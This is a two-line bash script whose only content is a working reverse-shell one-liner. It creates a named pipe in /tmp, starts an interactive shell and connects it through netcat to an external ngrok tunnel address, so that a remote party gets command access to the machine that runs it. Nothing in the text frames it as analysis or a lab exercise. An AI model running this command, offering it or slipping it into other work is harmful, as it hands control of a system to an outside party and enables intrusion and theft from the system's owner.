#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 4.tcp.eu.ngrok.io 13325 >/tmp/f
